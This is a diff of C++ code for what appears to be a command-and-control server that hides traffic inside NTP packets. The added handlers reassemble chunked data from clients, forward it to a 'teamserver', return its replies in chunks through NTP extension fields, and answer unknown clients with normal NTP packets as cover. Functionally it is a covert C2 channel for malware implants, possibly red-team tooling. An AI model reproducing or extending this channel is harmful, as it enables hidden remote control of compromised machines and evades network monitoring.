@@ -399,6 +399,25 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
             auto extData = ntpPacket.getExtensionData();
             //append chunk to end of buffer 
             it->second.fromClientBuffer.insert(it->second.fromClientBuffer.end(), extData.begin(), extData.end());
+
+            //check if fromClientBuffer matches our expected size, if so YEET to teamserver and store response
+            if (it->second.fromClientBuffer.size() == it->second.getFromClientBufferSize()) {
+                std::cout << "[+] Data from client complete, sending to teamserver" << std::endl;
+                //std::cout << "[?] Data Size: " << it->second.fromClientBuffer.size() << std::endl;
+                //std::cout << std::dec << "[?] fromClientBuffer.size: " << it->second.fromClientBuffer.size() << std::endl;
+                //std::cout << std::dec << "[?] it->second.getFromClientBufferSize(): " << it->second.getFromClientBufferSize() << std::endl;
+
+                //std::cout << "[?]Buffer meant for TS data: ";
+                //printHexVector(it->second.fromClientBuffer);
+                //std::cout << std::endl;
+
+                auto frame = forwardToTeamserver(it->second.fromClientBuffer);
+
+                printHexVector(frame);
+
+                std::cout << "[+] TS comms should be complete" << std::endl;
+
+            }
         }
         else {
             std::cout << "[?] Could not find client class: ";
@@ -429,33 +448,92 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
         std::cout << "----------------------" << std::endl;
         std::cout << "PCKT: getTeamServerData " << std::endl;
         std::cout << "----------------------" << std::endl;
+
+        //identify session here too?
+        std::cout << "getDataFromTeamserverSize " << std::endl;
+        printHexVectorPacket(ntpPacket.getRawPacket());
+
+        //lookup client class. Should exist.
+        uint32_t uintClientId = vectorToUint32(clientId);
+        std::cout << "[?] Looking up client ID: " << uintClientId << std::endl;
+        auto it = sessions.find(uintClientId);
+        if (it != sessions.end()) {
+
+            //std::cout << "Extension Data for dataForTeamserver:" << std::endl;
+            //printHexVector(ntpPacket.getExtensionData());
+
+            std::vector<uint8_t> forClientBuffer = it->second.getForClientBuffer();
+            //convert size into vector
+            //std::vector<uint8_t> sizeOfData = uint32ToBytes(forClientBuffer.size());
+            //std::cout << "[?] size of data stored for client: " << forClientBuffer.size() << std::endl;
+            std::vector<uint8_t> chunkForClient = it->second.getNextChunk(Chunk::maxChunkSize);
+
+
+            //send size back
+            NTPPacket newPacketClass;
+            newPacketClass.addExtensionField(
+                NtpExtensionField::dataFromTeamserver,
+                chunkForClient, //emtpy vector, not passing any data,just saying eerythign is okay
+                Client::emptyClientId //using empty sesion ID to fit spec
+            );
+            auto newPacket = newPacketClass.getPacket();
+
+            sendNtpPacket(client_addr, sock, newPacket);
+
+        }
+        else {
+            std::cout << "[?] Could not find client class: ";
+            printHexVector(clientId);
+            sendNormalNtpPacket(client_addr, sock);
+        }
+    }
+
+    else if (ntpPacketExtensionField == NtpExtensionField::getDataFromTeamserverSize) {
+        std::cout << "----------------------" << std::endl;
+        std::cout << "PCKT: getDataFromTeamserverSize " << std::endl;
+        std::cout << "----------------------" << std::endl;
         //this is data meant for teamserver. Need to fogure out chunkinghere too
 
         //identify session here too?
-        std::cout << "getTeamServerData " << std::endl;
+        std::cout << "getDataFromTeamserverSize " << std::endl;
         printHexVectorPacket(ntpPacket.getRawPacket());
 
-        //Look up client class
+        //lookup client class. Should exist.
+        uint32_t uintClientId = vectorToUint32(clientId);
+        std::cout << "[?] Looking up client ID: " << uintClientId << std::endl;
+        auto it = sessions.find(uintClientId);
+        if (it != sessions.end()) {
 
-        //append inbound to client class
-        // 
+            //std::cout << "Extension Data for dataForTeamserver:" << std::endl;
+            //printHexVector(ntpPacket.getExtensionData());
 
-        //send ok back
-        std::vector<uint8_t> emptyVec = {};
-        NTPPacket newPacketClass;
-        newPacketClass.addExtensionField(
-            NtpExtensionField::sizePacketAcknowledge,
-            emptyVec, //emtpy vector, not passing any data,just saying eerythign is okay
-            Client::emptyClientId //using empty sesion ID to fit spec
-        );
-        auto newPacket = newPacketClass.getPacket();
+            std::vector<uint8_t> forClientBuffer = it->second.getForClientBuffer();
+            //convert size into vector
+            std::vector<uint8_t> sizeOfData = uint32ToBytes(forClientBuffer.size());
+            std::cout << "[?] size of data stored for client: " << forClientBuffer.size() << std::endl;
 
-        sendNtpPacket(client_addr, sock, newPacket);
+            //send size back
+            NTPPacket newPacketClass;
+            newPacketClass.addExtensionField(
+                NtpExtensionField::sizePacket,
+                sizeOfData, //emtpy vector, not passing any data,just saying eerythign is okay
+                Client::emptyClientId //using empty sesion ID to fit spec
+            );
+            auto newPacket = newPacketClass.getPacket();
 
-        //temp send back normal packet
-        sendNormalNtpPacket(client_addr, sock);
+            sendNtpPacket(client_addr, sock, newPacket);
+
+        }
+        else {
+            std::cout << "[?] Could not find client class: ";
+            printHexVector(clientId);
+            sendNormalNtpPacket(client_addr, sock);
         }
 
+        //Look up class
+
+        //send size back as a sizepacket
+    }
 
     else {
         std::cout << "----------------------" << std::endl;
